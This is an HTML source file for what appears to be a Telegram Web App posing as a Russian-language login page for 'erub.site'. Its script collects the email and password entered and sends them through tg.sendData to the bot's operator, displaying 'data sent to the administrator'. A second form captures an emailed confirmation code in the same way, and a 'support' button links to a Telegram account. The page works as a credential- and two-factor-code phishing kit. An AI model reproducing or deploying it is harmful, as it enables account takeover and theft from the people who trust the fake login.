<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Вход в erub.site</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 20px;
            padding: 30px;
            width: 100%;
            max-width: 400px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
        }
        h1 { text-align: center; color: #333; margin-bottom: 5px; }
        .subtitle { text-align: center; color: #666; margin-bottom: 30px; font-size: 14px; }
        .form-group { margin-bottom: 20px; }
        .form-group label { display: block; margin-bottom: 8px; color: #555; font-weight: 500; }
        .form-group input {
            width: 100%;
            padding: 12px 15px;
            border: 2px solid #e0e0e0;
            border-radius: 10px;
            font-size: 16px;
            transition: border-color 0.3s;
        }
        .form-group input:focus {
            outline: none;
            border-color: #667eea;
        }
        .btn-primary {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s;
        }
        .btn-primary:hover { transform: translateY(-2px); }
        .btn-primary:active { transform: translateY(0); }
        .btn-support {
            width: 100%;
            padding: 12px;
            background: #f5f5f5;
            color: #333;
            border: 2px solid #e0e0e0;
            border-radius: 10px;
            font-size: 14px;
            cursor: pointer;
            margin-top: 10px;
        }
        .btn-support:hover { background: #e8e8e8; }
        .message {
            margin-top: 20px;
            padding: 12px;
            border-radius: 10px;
            display: none;
            text-align: center;
        }
        .message.success { display: block; background: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
        .message.error { display: block; background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
        .message.info { display: block; background: #d1ecf1; color: #0c5460; border: 1px solid #bee5eb; }
        .footer { margin-top: 20px; }
        #codeForm { margin-top: 20px; display: none; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🏠 erub.site</h1>
        <p class="subtitle">Вход в систему</p>
        
        <div id="loginForm">
            <div class="form-group">
                <label for="email">📧 Email</label>
                <input type="email" id="email" placeholder="Введите ваш email">
            </div>
            <div class="form-group">
                <label for="password">🔑 Пароль</label>
                <input type="password" id="password" placeholder="Введите пароль">
            </div>
            <button id="submitBtn" class="btn-primary">🔓 Войти</button>
        </div>

        <div id="codeForm">
            <div class="form-group">
                <label for="codeInput">📧 Код подтверждения</label>
                <input type="text" id="codeInput" placeholder="Введите код с почты">
            </div>
            <button id="submitCodeBtn" class="btn-primary">✅ Подтвердить</button>
        </div>

        <div id="message" class="message"></div>
        
        <div class="footer">
            <button onclick="openSupport()" class="btn-support">🆘 Техническая поддержка</button>
        </div>
    </div>
    
    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();
        
        const emailInput = document.getElementById('email');
        const passwordInput = document.getElementById('password');
        const codeInput = document.getElementById('codeInput');
        const submitBtn = document.getElementById('submitBtn');
        const submitCodeBtn = document.getElementById('submitCodeBtn');
        const messageDiv = document.getElementById('message');
        const loginForm = document.getElementById('loginForm');
        const codeForm = document.getElementById('codeForm');
        
        function showMessage(text, type = 'info') {
            messageDiv.textContent = text;
            messageDiv.className = `message ${type}`;
            setTimeout(() => { messageDiv.style.display = 'none'; }, 5000);
        }
        
        // Отправка данных
        submitBtn.addEventListener('click', function() {
            const email = emailInput.value.trim();
            const password = passwordInput.value.trim();
            
            if (!email || !password) {
                showMessage('Заполните все поля', 'error');
                return;
            }
            
            const data = JSON.stringify({ email: email, password: password });
            
            try {
                tg.sendData(data);
                showMessage('✅ Данные отправлены администратору!', 'success');
                emailInput.value = '';
                passwordInput.value = '';
            } catch (error) {
                showMessage('❌ Ошибка отправки', 'error');
            }
        });
        
        // Отправка кода
        submitCodeBtn.addEventListener('click', function() {
            const code = codeInput.value.trim();
            if (!code) {
                showMessage('Введите код', 'error');
                return;
            }
            
            try {
                tg.sendData(JSON.stringify({ code: code }));
                showMessage('✅ Код отправлен!', 'success');
                codeInput.value = '';
                codeForm.style.display = 'none';
                loginForm.style.display = 'block';
            } catch (error) {
                showMessage('❌ Ошибка отправки', 'error');
            }
        });
        
        // Enter
        emailInput.addEventListener('keypress', e => { if (e.key === 'Enter') passwordInput.focus(); });
        passwordInput.addEventListener('keypress', e => { if (e.key === 'Enter') submitBtn.click(); });
        codeInput.addEventListener('keypress', e => { if (e.key === 'Enter') submitCodeBtn.click(); });
        
        function openSupport() {
            window.open('https://t.me/potok457', '_blank');
        }
        
        // Показываем форму кода если нужно
        window.showCodeForm = function() {
            loginForm.style.display = 'none';
            codeForm.style.display = 'block';
            showMessage('Введите код с почты', 'info');
        };
    </script>
</body>
</html>
